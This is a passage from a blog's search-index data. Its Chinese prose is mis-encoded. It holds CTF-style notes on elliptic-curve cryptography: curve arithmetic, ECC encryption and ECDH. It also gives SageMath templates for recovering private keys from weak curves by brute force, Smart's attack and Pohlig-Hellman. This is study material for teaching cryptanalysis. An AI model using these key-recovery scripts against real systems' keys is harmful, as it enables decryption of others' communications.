TLSæµé‡è§£å¯†ï¼šWiresharké¦–é€‰é¡¹ - TLS - RSA keys list - Editâ€¦ - TLS Decrypt","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"æµé‡","slug":"æµé‡","permalink":"https://lazzzaro.github.io/tags/%E6%B5%81%E9%87%8F/"},{"name":"USB","slug":"USB","permalink":"https://lazzzaro.github.io/tags/USB/"}],"author":"Lazzaro"},{"title":"ECC","slug":"crypto-ECC","date":"2020-11-07T11:33:18.000Z","updated":"2023-10-27T16:19:11.994Z","comments":true,"path":"2020/11/07/crypto-ECC/","permalink":"https://lazzzaro.github.io/2020/11/07/crypto-ECC/","excerpt":"","text":"ECCæ¤­åœ†æ›²çº¿å¯†ç å­¦ï¼ˆè‹±è¯­ï¼šElliptic Curve Cryptographyï¼Œç¼©å†™ï¼šECCï¼‰æ˜¯ä¸€ç§åŸºäºæ¤­åœ†æ›²çº¿æ•°å­¦çš„å…¬å¼€å¯†é’¥åŠ å¯†ç®—æ³•ã€‚ä¸ä¼ ç»Ÿçš„åŸºäºå¤§è´¨æ•°å› å­åˆ†è§£å›°éš¾æ€§çš„åŠ å¯†æ–¹æ³•ä¸åŒï¼ŒECC ä¾èµ–äºè§£å†³æ¤­åœ†æ›²çº¿ç¦»æ•£å¯¹æ•°é—®é¢˜çš„å›°éš¾æ€§ã€‚å®ƒçš„ä¼˜åŠ¿ä¸»è¦åœ¨äºç›¸å¯¹äºå…¶å®ƒæ–¹æ³•ï¼Œå®ƒå¯ä»¥åœ¨ä½¿ç”¨è¾ƒçŸ­å¯†é’¥é•¿åº¦çš„åŒæ—¶ä¿æŒç›¸åŒçš„å¯†ç å¼ºåº¦ã€‚ç›®å‰æ¤­åœ†æ›²çº¿ä¸»è¦é‡‡ç”¨çš„æœ‰é™åŸŸæœ‰ä»¥ç´ æ•°ä¸ºæ¨¡çš„æ•´æ•°åŸŸ $\\text{GF}(p)$å’Œç‰¹å¾ä¸º2çš„ä¼½ç½—ååŸŸ $\\text{GF}(2^m)$ã€‚ â€‹ æ¤­åœ†æ›²çº¿æ¤­åœ†æ›²çº¿çš„å®šä¹‰å¼ï¼š$y^2+axy+by=x^3+cx^2+dx+e$ ä¸€èˆ¬æ–¹ç¨‹ï¼š$y^2+a_1xy+a_3y=x^3+a_2x^2+a_4x+a_6$ æœ€å¸¸ç”¨æ–¹ç¨‹ï¼ˆç»´å°”æ–¯ç‰¹æ‹‰æ–¯æ ‡å‡†å½¢å¼ï¼‰$y^2=x^3+ax+b$ï¼Œåˆ¤åˆ«å¼ $\\Delta=-16(4a^3+27b^2)\\neq 0$ æ¤­åœ†æ›²çº¿çš„å®šä¹‰ä¹Ÿè¦æ±‚æ›²çº¿æ˜¯éå¥‡å¼‚çš„ã€‚å‡ ä½•ä¸Šæ¥è¯´ï¼Œè¿™æ„å‘³ç€å›¾åƒé‡Œé¢æ²¡æœ‰å°–ç‚¹ã€è‡ªç›¸äº¤æˆ–å­¤ç«‹ç‚¹ã€‚ä»£æ•°ä¸Šæ¥è¯´ï¼Œè¿™æˆç«‹å½“ä¸”ä»…å½“åˆ¤åˆ«å¼ $\\Delta \\neq 0$ã€‚ è¿˜éœ€è¦ä¸€ä¸ªæ— ç©·è¿œç‚¹ä½œä¸ºæ›²çº¿çš„ä¸€éƒ¨åˆ†ï¼Œç”¨ $\\text{O}$ è¡¨ç¤ºã€‚ æ¤­åœ†æ›²çº¿è¡¨è¾¾å¼$\\{(x,y) \\in \\mathbb{R}^2 \\mid y^2=x^3+ax+b,4a^3+27b^2\\neq0\\} \\cup \\{\\text{O}\\}$ æ¤­åœ†æ›²çº¿é˜¿å°”è´ç¾¤$\\text{O}$ ä¸ºé›¶å…ƒï¼Œç›¸åæ•° $P$ ä¸ºå…³äºXè½´å¯¹ç§°çš„å¦ä¸€è¾¹çš„ç‚¹ï¼ŒåŠ æ³•è§„åˆ™ä¸ºç›´çº¿ä¸‰ç‚¹ $P+Q+R=0$ã€‚ å‡ ä½•åŠ æ³•æ™®é€šç›¸äº¤ä¸‰ç‚¹ï¼š$P+Q+R=0$ æ™®é€šç›¸äº¤ä¸¤ç‚¹ï¼š$P+P+Q=0$ï¼Œ$P+Q+Q=0$ ï¼ˆä¸€ç‚¹ç›¸åˆ‡ï¼‰ å‚ç›´ç›¸äº¤ä¸¤ç‚¹ï¼š$P+Q+0=0$ ï¼ˆå‚ç›´Xè½´ï¼‰ å‚ç›´ç›¸äº¤ä¸€ç‚¹ï¼š$P+P+0=0$ ï¼ˆå‚ç›´Xè½´+ä¸€ç‚¹ç›¸åˆ‡ï¼‰ ä»£æ•°åŠ æ³•å»æ‰ç‰¹æ®Šæƒ…å†µï¼Œåªè€ƒè™‘ä¸¤ä¸ªéé›¶éå¯¹ç§°çš„ç‚¹ $P=(x_P,y_P)$ å’Œ $Q=(x_Q,y_Q)$ã€‚ è‹¥ $P$ å’Œ $Q$ ä¸åŒï¼Œå³ $x_P \\neq x_Q$ï¼Œç›´çº¿æ–œç‡ $k=\\cfrac{y_P-y_Q}{x_P-x_Q}$ è‹¥ $P$ å’Œ $Q$ ç›¸åŒï¼Œå³ $x_P =x_Q$ï¼Œç›´çº¿æ–œç‡ $k=\\cfrac{3x_P^2+a}{2y_P}$ è¿™æ¡ç›´çº¿å’Œæ¤­åœ†æ›²çº¿çš„äº¤ç‚¹ $R=(x_R,y_R)$ï¼Œåˆ™ï¼š $x_R=k^2-x_P-x_Q$ $y_R=y_P+k(x_R-x_P)=y_Q+k(x_R-x_Q)$ äºæ˜¯ï¼š$P+Q=(x_P,y_P)+(x_Q,y_Q)=-R=(x_R,-y_R)$ æ ‡é‡ç§¯ï¼ˆç‚¹ç§¯/æ•°ä¹˜/å€ä¹˜ï¼‰$Q=nP=P+P+\\cdots+P=\\sum_{i=0}^{n-1}(b_i\\cdot2^i)P,\\quad b_i=\\{0,1\\}$ï¼Œ$b_i$ ä¸º $n$ çš„å„æ¯”ç‰¹ä½å€¼ã€‚ å¯¹æ•°$Q=nP$ï¼Œå·²çŸ¥ $Q,P$ï¼Œæ±‚ $n$ã€‚ â€‹ æœ‰é™åŸŸæ¤­åœ†æ›²çº¿æ¤­åœ†æ›²çº¿æ˜¯è¿ç»­çš„ï¼Œå¹¶ä¸é€‚åˆç”¨äºåŠ å¯†ï¼Œæ‰€ä»¥å¿…é¡»æŠŠæ¤­åœ†æ›²çº¿å˜æˆç¦»æ•£çš„ç‚¹ï¼ŒæŠŠæ¤­åœ†æ›²çº¿å®šä¹‰åœ¨æœ‰é™åŸŸä¸Šã€‚ æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿æ˜¯æŒ‡åœ¨æ¤­åœ†æ›²çº¿çš„å®šä¹‰å¼ä¸­ï¼Œæ‰€æœ‰çš„ç³»æ•°éƒ½æ˜¯åœ¨æŸä¸ªæœ‰é™åŸŸ $\\text{GF}(p)$ ä¸­çš„å…ƒç´ ï¼Œå…¶ä¸­ $p$ ä¸ºä¸€ä¸ªå¤§ç´ æ•°ã€‚ ç»™å‡ºä¸€ä¸ªæœ‰é™åŸŸ $\\text{F}p$ï¼Œ $\\text{F}p$ ä¸­æœ‰ $p$ï¼ˆ$p$ ä¸ºè´¨æ•°ï¼‰ä¸ªå…ƒç´  $0,1,2,\\cdots,p-1$ï¼› $\\text{F}p$ çš„åŠ æ³•æ˜¯ $a+b \\equiv c \\pmod p$ï¼› $\\text{F}p$ çš„ä¹˜æ³•æ˜¯ $a\\times b \\equiv c \\pmod p$ï¼› $\\text{F}p$ çš„é™¤æ³•æ˜¯ $\\cfrac{a}{b} \\equiv c \\pmod p$ï¼Œå³ $a \\times b^{-1} \\equiv c \\pmod p$ï¼Œ$b^{-1}$ ä¸º $b$ çš„é€†å…ƒï¼Œæ»¡è¶³ $b \\times b^{-1} \\equiv 1 \\pmod p$ï¼› $\\text{F}p$ çš„å•ä½å…ƒæ˜¯ $1$ï¼Œé›¶å…ƒæ˜¯ $\\text{O}$ï¼› $\\text{F}p$ åŸŸå†…è¿ç®—æ»¡è¶³äº¤æ¢å¾‹ã€ç»“åˆå¾‹ã€åˆ†é…ç‡ã€‚ æ¤­åœ†æ›²çº¿ $\\text{E}p(a,b)$ï¼Œ$p$ ä¸ºè´¨æ•°ï¼Œ$x,y \\in [0,p-1]$ï¼š$y^2=x^3+ax+b \\pmod p$ï¼Œ é€‰æ‹©ä¸¤ä¸ªæ»¡è¶³ä¸‹åˆ—çº¦æŸæ¡ä»¶çš„å°äº $p$ çš„éè´Ÿæ•´æ•° $a,b$ï¼š$4a^3+27b^2 \\neq 0 \\pmod p$ã€‚ $\\text{F}p$ ä¸Šçš„æ¤­åœ†æ›²çº¿åŒæ ·æœ‰åŠ æ³•ï¼š æ— ç©·è¿œç‚¹ $\\text{O}$ æ˜¯é›¶å…ƒï¼Œæœ‰ $\\text{O}+\\text{O}=\\text{O}$ï¼Œ$\\text{O}+P=P$ï¼› $P(x,y)$ çš„è´Ÿå…ƒæ˜¯ $(x,-y \\bmod p)=(x,p-y)$ï¼Œæœ‰ $P+(-P)=\\text{O}$ï¼› $P(x_1,y_1),Q(x_2,y_2)$ çš„å’Œ $R(x_3,y_3)$ æœ‰å¦‚ä¸‹å…³ç³»ï¼š $x_3 \\equiv k^2-x_1-x_2 \\pmod p$ $y_3 \\equiv k(x_1-x_3)-y_1 \\pmod p$ è‹¥ $P=Q$ åˆ™ $k=\\cfrac{3x_1^2+a}{2y_1}\\pmod p$ï¼› è‹¥ $P \\neq Q$ åˆ™ $k=\\cfrac{y_2-y_1}{x_2-x_1} \\pmod p$ã€‚ ç‚¹çš„é˜¶å¦‚æœæ¤­åœ†æ›²çº¿ä¸Šä¸€ç‚¹ $P$ï¼Œå­˜åœ¨æœ€å°çš„æ­£æ•´æ•° $n$ ä½¿å¾—æ•°ä¹˜ $nP=\\text{O}$ ï¼Œåˆ™å°† $n$ ç§°ä¸º $P$ çš„é˜¶ï¼›è‹¥ $n$ ä¸å­˜åœ¨ï¼Œåˆ™ $P$ æ˜¯æ— é™é˜¶çš„ã€‚ åŠ å¯†åŸç†è€ƒè™‘ $K=kG$ ï¼Œå…¶ä¸­ $K,G$ ä¸ºæ¤­åœ†æ›²çº¿ $\\text{E}p(a,b)$ ä¸Šçš„ç‚¹ï¼Œ$n$ ä¸º $G$ çš„é˜¶ï¼ˆ$nG=\\text{O}$ï¼‰ï¼Œ$k$ ä¸ºå°äº $n$ çš„æ•´æ•°ã€‚ ç»™å®š $k$ å’Œ $G$ ï¼Œæ ¹æ®åŠ æ³•æ³•åˆ™ï¼Œè®¡ç®— $K$ å¾ˆå®¹æ˜“ï¼Œä½†åè¿‡æ¥ï¼Œç»™å®š $K$ å’Œ $G$ï¼Œæ±‚ $k$ å°±éå¸¸å›°éš¾ã€‚å› ä¸ºå®é™…ä½¿ç”¨ä¸­çš„ECCåŸåˆ™ä¸ŠæŠŠ $p$ å–å¾—ç›¸å½“å¤§ï¼Œ$n$ ä¹Ÿç›¸å½“å¤§ï¼Œè¦æŠŠ $n$ ä¸ªè§£ç‚¹é€ä¸€ç®—å‡ºæ¥åˆ—æˆä¸Šè¡¨æ˜¯ä¸å¯èƒ½çš„ã€‚ è¿™å°±æ˜¯æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•çš„æ•°å­¦ä¾æ®ã€‚ ç‚¹ $G$ ç§°ä¸ºåŸºç‚¹ (base point)ï¼Œ$k$ ($k&lt;n$) ä¸ºç§æœ‰å¯†é’¥ (private key)ï¼Œ$K$ ä¸ºå…¬å¼€å¯†é’¥ (public key)ã€‚ é€šä¿¡ç®—æ³• Aé€‰å®šä¸€æ¡æ¤­åœ†æ›²çº¿ $\\text{E}p(a,b)$ï¼Œå¹¶å–æ¤­åœ†æ›²çº¿ä¸Šä¸€ç‚¹ä½œä¸ºåŸºç‚¹ $G$ï¼› Aé€‰æ‹©ä¸€ä¸ªç§æœ‰å¯†é’¥ $k$ ($k&lt;n$)ï¼Œå¹¶ç”Ÿæˆå…¬å¼€å¯†é’¥ $K=kG$ï¼› Aå°† $\\text{E}p(a,b)$ å’Œç‚¹ $K,G$ ä¼ ç»™Bï¼› Bæ”¶åˆ°ä¿¡æ¯åï¼Œå°†å¾…ä¼ è¾“çš„æ˜æ–‡ç¼–ç åˆ° $\\text{E}p(a,b)$ ä¸Šçš„ä¸€ç‚¹ $M$ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ªéšæœºæ•´æ•° $r$ï¼ˆ$r&lt;n$ï¼Œ$n$ ä¸º $G$ çš„é˜¶æ•°ï¼‰ï¼› Bè®¡ç®—ç‚¹ $C_1=M+rK$ å’Œ $C_2=rG$ï¼› Bå°† $C_1,C_2$ ä¼ ç»™Aï¼› Aæ”¶åˆ°ä¿¡æ¯åï¼Œè®¡ç®— $C_1-kC_2$ï¼Œç»“æœå°±åº”è¯¥æ˜¯ç‚¹ $M$ã€‚ ï¼ˆ$C_1-kC_2=M+rK-krG=M+rkG-krG=M$ï¼‰ 123456789101112131415161718192021222324252627282930#Sagea = b = p = #EllipticCurve([a1, a2, a3, a4, a6]) -- y^2+(a1)xy+(a3)y=x^3+(a2)x^2+(a4)x+(a6)E = EllipticCurve(GF(p), [0, 0, 0, a, b])base = E([, ])pub = E([, ])c1 = E([, ])c2 = E([, ])X = base#Bruteforce secret kfor i in range(1, n): if X == pub: k = i print(&quot;[+] secret k = &quot;, i) break else: X = X + basem = c2 - (c1 * k)print(&quot;[+] x = &quot;, m[0])print(&quot;[+] y = &quot;, m[1])print(&quot;[+] x+y = &quot;, m[0] + m[1]) â€‹ å‚è€ƒECCæ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ï¼šä»‹ç» ECCæ¤­åœ†æ›²çº¿è¯¦è§£(æœ‰å…·ä½“å®ä¾‹) æœ‰é™åŸŸæ¤­åœ†æ›²çº¿å®šä¹‰ä¸è®¡ç®—æ–¹å¼ ECCæ¤­åœ†æ›²çº¿å¯†ç å­¦çš„åŸç†ã€å…¬å¼æ¨å¯¼ã€ä¾‹å­ã€Pythonå®ç°å’Œåº”ç”¨ â€‹ å¸¸è§æ”»å‡» Smartâ€™s attacké€‚ç”¨æƒ…å†µï¼š$\\text{E.order}()=p$ã€‚ 123456789101112131415161718192021222324252627282930313233p = A = B = E = EllipticCurve(GF(p),[A,B])P = E(,)Q = E(,)def SmartAttack(P,Q,p): E = P.curve() Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ]) P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True) for P_Qp in P_Qps: if GF(p)(P_Qp.xy()[1]) == P.xy()[1]: break Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True) for Q_Qp in Q_Qps: if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]: break p_times_P = p*P_Qp p_times_Q = p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P return ZZ(k)r = SmartAttack(P, Q, p)print(r) â€‹ ECDLPECDLPå³æ¤­åœ†æ›²çº¿ä¸Šçš„ç¦»æ•£å¯¹æ•°é—®é¢˜ï¼ˆThe Elliptic Curve Discrete Logarithm Problemï¼‰ã€‚ æ¤­åœ†æ›²çº¿ä¸Šç¦»æ•£å¯¹æ•°é—®é¢˜ECDLPå®šä¹‰å¦‚ä¸‹ï¼šç»™å®šç´ æ•° $p$ å’Œæ¤­åœ†æ›²çº¿ $E$ï¼Œå¯¹ $Q=kP$ï¼Œåœ¨å·²çŸ¥ $P,Q$ çš„æƒ…å†µä¸‹æ±‚å‡ºå°äº $p$ çš„æ­£æ•´æ•° $k$ã€‚å¯ä»¥è¯æ˜ç”± $k$ å’Œ $P$ è®¡ç®— $Q$ æ¯”è¾ƒå®¹æ˜“ï¼Œè€Œç”± $Q$ å’Œ $P$ è®¡ç®— $k$ åˆ™æ¯”è¾ƒå›°éš¾ã€‚ å°†æ¤­åœ†æ›²çº¿ä¸­çš„åŠ æ³•è¿ç®—ä¸ç¦»æ•£å¯¹æ•°ä¸­çš„æ¨¡ä¹˜è¿ç®—ç›¸å¯¹åº”ï¼Œå°†æ¤­åœ†æ›²çº¿ä¸­çš„ä¹˜æ³•è¿ç®—ä¸ç¦»æ•£å¯¹æ•°ä¸­çš„æ¨¡å¹‚è¿ç®—ç›¸å¯¹åº”ï¼Œæˆ‘ä»¬å°±å¯ä»¥å»ºç«‹åŸºäºæ¤­åœ†æ›²çº¿çš„å¯¹åº”çš„å¯†ç ä½“åˆ¶ã€‚ 12345678910111213141516171819#Sage Code 1p = a = b = E = EllipticCurve(GF(p),[a,b])P = E(, ) Q = E(, ) k = discrete_log(Q, P, operation=&#x27;+&#x27;) print(k)#Sage Code 2p = a = b = E = EllipticCurve(GF(p),[a,b])P = E(, ) Q = E(, ) k = P.discrete_log(Q)print(k) Pohlig-Hellmanç®—æ³•ç®—æ³•ç”±Pohligå’ŒHellmanå‘æ˜ï¼Œè¿™æ˜¯ä¸€ç§ä¸ºè§£å†³ç¦»æ•£å¯¹æ•°é—®é¢˜è€Œæå‡ºçš„æ”»å‡»æ–¹æ³•ï¼Œæ—©åœ¨1978å¹´å°±è¢«æå‡ºã€‚ä¸»è¦æ€æƒ³æ˜¯å¯¹é˜¶æ•°è¿›è¡Œåˆ†è§£ï¼Œæ¯”å¦‚æ•´æ•°åŸŸä¸­ $y = g^x \\pmod p$ é‡Œçš„ $x$ ä»¥åŠæ¤­åœ†æ›²çº¿ç¦»æ•£å¯¹æ•°é—®é¢˜ä¸­ $Gk = Q$ çš„ $G$ çš„é˜¶ $n$ï¼Œè¿™æ ·å°±æŠŠå¯¹åº”çš„ç¦»æ•£å¯¹æ•°é—®é¢˜è½¬ç§»åˆ°äº†æ¯ä¸ªå› å­æ¡ä»¶ä¸‹å¯¹åº”çš„ç¦»æ•£å¯¹æ•°ï¼Œç„¶åå¯ä»¥åˆ©ç”¨ä¸­å›½å‰©ä½™å®šç†è¿›è¡Œæ±‚è§£ã€‚ å‡è®¾éœ€è¦æ±‚è§£çš„å¼å­ä¸º $Q=lP$ï¼Œå…¶ä¸­ $P$ ä¸ºé€‰å–çš„ä¸€ä¸ªåŸºç‚¹ï¼Œ $l$ ä¸ºé€‰å®šçš„éšæœºæ•°ï¼Œç›¸å½“äºè¦æ±‚è§£çš„ç§é’¥ã€‚ é¦–å…ˆæ±‚å¾— $P$ çš„é˜¶ $n$ ï¼Œå³å¯ä½¿å¾— $nP$ ä¸å­˜åœ¨çš„æœ€å°æ­£æ•´æ•°ï¼Œå°† $n$ è¿›è¡Œåˆ†è§£ï¼Œè®¾ $n=p_1^{e_1}p_2^{e_2}\\cdots p_r^{e_r}$ï¼Œ å°†å› å­å–å‡ºï¼Œè®¡ç®— $l_i \\equiv l \\pmod {p_i^{e_i}},\\quad i \\in [1,r]$ï¼Œå³ $\\begin{cases} l \\equiv l_1 \\pmod {p_1^{e_1}} \\newline l \\equiv l_2 \\pmod {p_2^{e_2}} \\newline {\\vdots} \\newline l \\equiv l_r \\pmod {p_r^{e_r}} \\end{cases}$ å¦‚æœå¾—åˆ° $l_i(i \\in [1,r])$ çš„å€¼å°±èƒ½ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†è¿›è¡Œæ±‚è§£å¾—åˆ° $l$ï¼Œä¸‹é¢æ±‚è§£ $l_i$ã€‚ é¦–å…ˆå°† $l_i$ è®¾ä¸º $p_i$ è¡¨ç¤ºçš„å¤šé¡¹å¼ $l_i=z_0+z_1p_i+z_2p_i^2+ \\cdots +z_{e-1}p_i^{e-1}, \\quad z \\in [0,p_i-1]$ï¼Œ ä¸ºè®¡ç®— $z_i$ï¼Œåˆ†åˆ«å– $P_0$ å’Œ $Q_0$ï¼Œå¹¶å–å€¼ $P_0=\\cfrac{n}{p_i}P,\\quad Q_0=\\cfrac{n}{p_i}Q$ï¼Œ è¿™æ ·æœ‰ $p_iP_0=nP$ï¼Œåˆ™å¯å¾—åˆ° $Q_0=\\cfrac{n}{p_i}Q=\\cfrac{n}{p_i}(lP)=l(\\cfrac{n}{p_i}P)=lP_0$ï¼Œç›¸å½“äºåœ¨åŸè¡¨è¾¾å¼çš„ä¸¤è¾¹ä¹˜ä¸Š $\\cfrac{n}{p_i}$ï¼Œ å†è½¬å› $l_i$ï¼Œå…ˆæ±‚è§£ $z_0$ï¼š $l_iP=Q \\\\\\Rightarrow l_iP_0=Q_0 \\\\\\Rightarrow (z_0+z_1p_i+\\cdots+z_{e-1}p_i^{e-1})P_0=Q_0 \\\\\\Rightarrow z_0P_0=Q_0$ è¿™æ—¶ä¾¿å°†åœ¨ $P$ åŸŸä¸Šçš„ç¦»æ•£å¯¹æ•°åˆ†è§£åˆ°äº† $P_0$ åŸŸä¸Šï¼Œå› ä¸º $P_0$ çš„é˜¶æ˜¯ $p_i$ï¼Œå·²ç»è¾ƒåŸæœ¬çš„é˜¶ $n$ è¿ç®—çš„å¤æ‚åº¦å°äº†å¾ˆå¤šï¼Œå½“ç„¶ï¼Œé™¤é $n$ æœ¬èº«å°±æ˜¯ä¸ªå¤§ç´ æ•°ã€‚ æ±‚å¾— $z_0$ï¼Œå†ä»£å›åŸå¼ï¼š $(z_0+z_1p_i+\\cdots+z_{e-1}p_i^{e-1})P_0=Q_0 \\\\\\Rightarrow z_0P_0+(z_1p_i+\\cdots+z_{e-1}p_i^{e-1})P_0=Q_0 \\\\\\Rightarrow (z_1p_i+\\cdots+z_{e-1}p_i^{e-1})P_0=Q_0-z_0P_0 \\\\\\Rightarrow z_1p_i=Q_0-z_0P_0$ æ­¤æ—¶å°±å¯ä»¥æ±‚è§£ $z_1$ï¼Œç„¶åä¾æ¬¡å°† $z_i$ å…¨éƒ¨ç®—å‡ºæ¥ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº† $l_1$ï¼Œç„¶åä¾¿å¯ä»¥ä»£å…¥å‰é¢çš„ç­‰å¼ï¼Œå°† $l_i$ éƒ½æ±‚å‡ºåå³å¯åˆ©ç”¨ä¸­å›½å‰©ä½™å®šç†æ±‚å‡º $l$ã€‚ 123456789101112131415161718192021222324252627282930313233343536#Sage Code 1p = a = b = gx = gy = px = py = E = EllipticCurve(GF(p), [a, b])G = E(gx, gy)n = E.order()QA = E(px, py)factors = list(factor(n))m = 1moduli = []remainders = []print(f&quot;[+] Running Pohlig Hellman&quot;)print(factors)for i, j in factors: if i &gt; 10**9: print(i) break mod = i**j g2 = G*(n//mod) q2 = QA*(n//mod) r = discrete_log(q2, g2, operation=&#x27;+&#x27;) remainders.append(r) moduli.append(mod) m *= modr = crt(remainders, moduli)print(r) 1234567891011121314151617#Sage Code 2E = EllipticCurve(GF(p), [a, b])P = E()Q = E()factors, exponents = zip(*factor(E.order()))primes = [factors[i] ^ exponents[i] for i in range(len(factors))][:-2]print(primes)dlogs = []for fac in primes: t = int(int(P.order()) // int(fac)) dlog = discrete_log(t*Q,t*P,operation=&quot;+&quot;) dlogs += [dlog] print(&quot;factor: &quot;+str(fac)+&quot;, Discrete Log: &quot;+str(dlog)) #calculates discrete logarithm for each prime orderl = crt(dlogs,primes)print(l) â€‹ ECDHæ¤­åœ†æ›²çº¿è¿ªè²-èµ«å°”æ›¼å¯†é’¥äº¤æ¢ï¼ˆè‹±è¯­ï¼šElliptic Curve Diffieâ€“Hellman key exchangeï¼Œç¼©å†™ä¸ºECDHï¼‰ï¼Œæ˜¯ä¸€ç§åŒ¿åçš„å¯†é’¥åˆæ„åè®®ï¼ˆKey-agreement protocolï¼‰ï¼Œè¿™æ˜¯è¿ªè²-èµ«å°”æ›¼å¯†é’¥äº¤æ¢çš„å˜ç§ï¼Œé‡‡ç”¨æ¤­åœ†æ›²çº¿å¯†ç å­¦æ¥åŠ å¼ºæ€§èƒ½ä¸å®‰å…¨æ€§ã€‚åœ¨è¿™ä¸ªåå®šä¸‹ï¼ŒåŒæ–¹åˆ©ç”¨ç”±æ¤­åœ†æ›²çº¿å¯†ç å­¦å»ºç«‹çš„å…¬é’¥ä¸ç§é’¥å¯¹ï¼Œåœ¨ä¸€ä¸ªä¸å®‰å…¨çš„é€šé“ä¸­ï¼Œå»ºç«‹èµ·å®‰å…¨çš„å…±æœ‰åŠ å¯†èµ„æ–™ã€‚ ECDHä¸€èˆ¬æ¥è¯´äº¤æ¢çš„éƒ½æ˜¯ç§é’¥ï¼Œè¿™ä¸ªå¯†é’¥ä¸€èˆ¬ä½œä¸ºâ€œå¯¹ç§°åŠ å¯†â€çš„å¯†é’¥è€Œè¢«åŒæ–¹åœ¨åç»­æ•°æ®ä¼ è¾“ä¸­ä½¿ç”¨ã€‚ ECDHæ˜¯å»ºç«‹åœ¨è¿™æ ·ä¸€ä¸ªå‰æä¹‹ä¸Šçš„ï¼Œç»™å®šæ¤­åœ†æ›²çº¿ä¸Šçš„ä¸€ä¸ªç‚¹ $P$ï¼Œä¸€ä¸ªæ•´æ•° $k$ï¼Œæ±‚ $Q=kP$ å¾ˆå®¹æ˜“ï¼›ä½†æ˜¯é€šè¿‡$Q,P$ æ±‚è§£ $k$ å¾ˆéš¾ã€‚ ç®—æ³•æè¿° Aå’ŒBåŒæ–¹çº¦å®šä½¿ç”¨ECDHç§˜é’¥äº¤æ¢ç®—æ³•ï¼Œè¿™ä¸ªæ—¶å€™åŒæ–¹ä¹ŸçŸ¥é“äº†ECDHç®—æ³•é‡Œçš„ä¸€ä¸ªå¤§ç´ æ•° $p$ï¼Œè¿™ä¸ª $p$ å¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªç®—æ³•ä¸­çš„å¸¸é‡ï¼Œ$p$ çš„ä½æ•°å†³å®šäº†æ”»å‡»è€…ç ´è§£çš„éš¾åº¦ã€‚è¿˜æœ‰ä¸€ä¸ªæ•´æ•° $g$ ç”¨æ¥è¾…åŠ©æ•´ä¸ªç§˜é’¥äº¤æ¢ï¼Œ$g$ ä¸ç”¨å¾ˆå¤§ï¼ŒåŒæ–¹çŸ¥é“ $g$ å’Œ $p$ ä¹‹åå°±å¼€å§‹äº†ECDHäº¤æ¢ç§˜é’¥çš„è¿‡ç¨‹ã€‚ AçŸ¥é“äº†å…±ç”¨å‚æ•° $p$ å’Œ $g$ï¼Œç”Ÿæˆæ•´æ•° $a$ ä½œä¸ºç§é’¥ï¼ŒAåˆ©ç”¨ $p,g,a$ é€šè¿‡å…¬å¼ $g^a \\bmod p = A$ ç”Ÿæˆ $A$ ä½œä¸ºå…¬é’¥ä¼ é€’ã€‚ Bé€šè¿‡é“¾è·¯æ”¶åˆ°Aå‘æ¥çš„ $p,g,A$ï¼ŒçŸ¥é“äº†Açš„å…¬é’¥ $A$ã€‚è¿™ä¸ªæ—¶å€™Bä¹Ÿç”Ÿæˆè‡ªå·±çš„ç§é’¥ $b$ï¼Œç„¶åé€šè¿‡å…¬å¼ $g^b \\bmod p = B$ ç”Ÿæˆè‡ªå·±å…¬é’¥ $B$ã€‚ åœ¨å‘é€å…¬é’¥ $B$ å‰ï¼ŒBé€šè¿‡ $A^b \\bmod p = K$ ç”Ÿæˆ $K$ ä½œä¸ºå…¬å…±å¯†é’¥ï¼Œä½†æ˜¯å¹¶ä¸å‘é€ç»™Aã€‚ Aæ”¶åˆ°Bå‘æ¥çš„å…¬é’¥ $B$ ä»¥åï¼ŒåŒæ ·é€šè¿‡ $B^a \\bmod p = K$ ç”Ÿæˆå…¬å…±å¯†é’¥ $K$ï¼Œè¿™æ ·Aå’ŒBå°±é€šè¿‡ä¸ä¼ é€’ç§é’¥ $a$ å’Œ $b$ å®Œæˆäº†å¯¹å…¬å…±å¯†é’¥ $K$ çš„åå•†ã€‚ ä¸­é—´äººåªçŸ¥é“ $A$ å’Œ $B$ ä»¥åŠæ¤­åœ†æ›²çº¿çš„å…¬å…±å‚æ•°ï¼Œæ˜¯æ— æ³•ç®—å‡ºå…±äº«å¯†é’¥ $K$ çš„ã€‚ è¿™å…¶å®å°±æ˜¯è¿ªè²-èµ«å°”æ›¼é—®é¢˜ï¼šç»™å®šä¸‰ä¸ªç‚¹ $P,aP,bP$ï¼Œé‚£ä¹ˆ $abP$ çš„ç»“æœæ˜¯ä»€ä¹ˆï¼Ÿ æˆ–è€…å¯ä»¥è¿™ä¹ˆç†è§£ï¼šç»™å®šä¸‰ä¸ªæ•´æ•° $k,k^x,k^y$ï¼Œé‚£ä¹ˆ $k^{xy}$ çš„ç»“æœæ˜¯ä»€ä¹ˆï¼Ÿ å‚è€ƒ ECDHç§˜é’¥åå•†ç®—æ³•åŸç† ECCæ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ï¼šECDH å’Œ ECDSA æ”»å‡» ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰ å¼‚æˆ– Cryptography Dispatches: The Most Backdoor-Looking Bug Iâ€™ve Ever Seen Human-server - Union CTF 2021 â€‹ ECElGamalåœ¨å¯†ç å­¦ä¸­ï¼ŒElGamalåŠ å¯†ç®—æ³•æ˜¯ä¸€ä¸ªåŸºäºè¿ªè²-èµ«å°”æ›¼å¯†é’¥äº¤æ¢çš„éå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚GnuPGå’ŒPGPç­‰å¾ˆå¤šå¯†ç å­¦ç³»ç»Ÿä¸­éƒ½åº”ç”¨åˆ°äº†ElGamalç®—æ³•ã€‚ ElGamalåŠ å¯†ç®—æ³•å¯ä»¥å®šä¹‰åœ¨ä»»ä½•å¾ªç¯ç¾¤ $G$ ä¸Šã€‚å®ƒçš„å®‰å…¨æ€§å–å†³äº 